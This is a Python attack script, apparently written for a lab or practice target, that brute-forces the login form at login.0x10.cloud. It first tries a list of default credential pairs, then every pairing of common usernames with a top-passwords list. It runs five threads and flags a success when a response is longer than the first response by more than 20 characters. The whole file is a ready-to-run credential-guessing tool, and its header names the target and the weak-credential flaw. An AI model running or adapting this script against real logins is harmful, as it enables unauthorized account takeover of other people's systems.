# ============================================================
#  Default Credential & Brute Force Attack
#  Author: John Sebastian Laquis
#  Vulnerability: Weak/Default Credentials on Blog Login
#  Target: blog.0x10.cloud
# ============================================================
#
#  Phase 1: Try common default credential pairs
#  Phase 2: Brute force with expanded username/password lists
#


import urllib.request
import urllib.parse
import http.cookiejar
import time
import sys
import threading

import urllib.request
import urllib.parse
import time
import threading
import queue
import sys

TARGET = "http://login.0x10.cloud/"
DELAY = 0.1
THREADS = 5

BASELINE_LENGTH = None
FOUND = False
LOCK = threading.Lock()

# ── THREAD SAFE QUEUE (FIX #1) ───────────────────────────────
tasks = queue.Queue()

# ── REQUEST ──────────────────────────────────────────────────

def try_login(path, username, password):
    data = urllib.parse.urlencode({
        "username": username,
        "password": password
    }).encode()

    req = urllib.request.Request(TARGET + path, data=data, method="POST")
    req.add_header("User-Agent", "Mozilla/5.0")

    try:
        r = urllib.request.urlopen(req, timeout=5)
        body = r.read().decode("utf-8", errors="ignore")
        return r.geturl(), body
    except:
        return "", ""


# ── DETECTION (FIXED BASELINE LOGIC) ─────────────────────────

def is_success(body):
    global BASELINE_LENGTH

    if not body:
        return False

    length = len(body)

    # establish baseline from first request
    if BASELINE_LENGTH is None:
        BASELINE_LENGTH = length
        print(f"[DEBUG] Baseline = {BASELINE_LENGTH}")
        return False

    # REAL SIGNAL from your data: 93 vs 134
    return length > BASELINE_LENGTH + 20


# ── WORKER (THREAD SAFE FIX #2) ──────────────────────────────

def worker(path):
    global FOUND

    while not FOUND:
        try:
            username, password, phase = tasks.get_nowait()
        except queue.Empty:
            return

        final_url, body = try_login(path, username, password)

        length = len(body) if body else 0

        print(f"[{phase}] {username}:{password} → len={length}")

        if is_success(body):
            with LOCK:
                if FOUND:
                    return
                FOUND = True

            print("\n" + "-" * 25)
            print("-  SUCCESS — VALID CREDENTIALS FOUND!  -")
            print(f"-  USERNAME: {username}")
            print(f"-  PASSWORD: {password}")
            print(f"-  LENGTH: {length}")
            print(f"-  URL: {final_url}")
            print("-" * 25 + "\n")

            # graceful stop (NOT sys.exit in threads)
            return

        time.sleep(DELAY)


# ── WORDLISTS (UNCHANGED) ────────────────────────────────────

DEFAULTS = [
    ("admin","admin"),("admin","password"),("admin","1234"),
    ("admin","admin123"),("admin","secret"),("admin","letmein"),
    ("admin",""),("root","root"),("root","toor"),
    ("root","password"),("user","user"),("blog","blog"),
    ("test","test"),("guest","guest"),("","")
]

USERNAMES = [
    "admin","administrator","root","user",
    "blog","editor","manager","support","test"
]

PASSWORDS = [
    "password","123456","12345678","qwerty","abc123",
    "monkey","1234567","letmein","trustno1","dragon",
    "baseball","iloveyou","master","sunshine","princess",
    "welcome","shadow","superman","michael","football",
    "admin","admin123","pass","pass123","secret",
    "changeme","123123","111111","000000","password1"
]


# ── BUILD TASKS ──────────────────────────────────────────────

for u, p in DEFAULTS:
    tasks.put((u, p, "DEFAULT"))

for u in USERNAMES:
    for p in PASSWORDS:
        tasks.put((u, p, "BRUTE"))


# ── MAIN ─────────────────────────────────────────────────────

print("\n")
print("=" * 60)
print(" Default Credential Attack")
print("=" * 60)
print(f"On: [*] Target: {TARGET}")
print("=" * 60)
print("\n")

login_path = "/"

threads = []

for _ in range(THREADS):
    t = threading.Thread(target=worker, args=(login_path,))
    t.start()
    threads.append(t)

for t in threads:
    t.join() 

print("\nBrute force attack complete.")
print("=" * 60)